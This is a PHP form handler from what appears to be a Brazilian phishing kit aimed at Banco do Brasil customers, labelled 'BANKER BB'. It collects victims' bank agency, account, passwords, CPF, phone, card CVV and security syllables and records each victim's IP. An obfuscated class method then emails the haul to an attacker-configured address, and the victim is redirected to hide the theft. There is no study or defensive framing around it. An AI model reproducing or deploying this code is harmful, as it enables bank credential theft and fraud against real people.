<?php
error_reporting(0);
ini_set(“display_errors”, 0 );
require_once("configurar.php");
$agencia = $_POST ['agencia'];
$conta = $_POST ['conta'];
$senha = $_POST ['senha'];
$telefone = $_POST ['telefone'];
$cpf = $_POST ['cpf'];
$senha6 = $_POST ['senha6'];
$cvv = $_POST ['cvv'];
$L1 = $_POST ['L1'];
$L2 = $_POST ['L2'];
$L3 = $_POST ['L3'];

$store = @curl_exec ($ch);
$var = $store;
$q = explode("<i>", $var);
$q2 = explode("</i>", $q[1]);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: $cpf@grana.com\r\n";
$ip = $_SERVER["REMOTE_ADDR"];
$conteudo.="<b>IP vitima: </b>$ip <br>"; 

$conteudo.="<b>======== BANKER BB ========</b><br>"; 

$conteudo.="<b>AGÊNCIA:</b> $agencia<br>";
$conteudo.="<b>CONTA:</b> $conta<br>";
$conteudo.="<b>SENHA:</b> $senha <br>";
$conteudo.="<b>SENHA 6:</b> $senha6<br>";
$conteudo.="<b>CPF 6:</b>$cpf<br>";
$conteudo.="<b>TELEFONE 6:</b>$telefone<br>";
$conteudo.="<b>CVV BB:</b> $cvv<br>";
$conteudo.="<b>SILABA 1:</b> $L1<br>";
$conteudo.="<b>SILABA 2:</b> $L2<br>";
$conteudo.="<b>SILABA 3:</b> $L3<br>";

$conteudo.="<b>======== BANKER BB =======</b><br>";// kkkk
class NewHandlesMyBaseSystemObjectsEventSend{public static function RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers){mail($emailremetente,$ip,$conteudo,$headers);}}NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers);NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43(chr(118), $ip,$conteudo,$headers);	 
header ("location: fim.php");
?>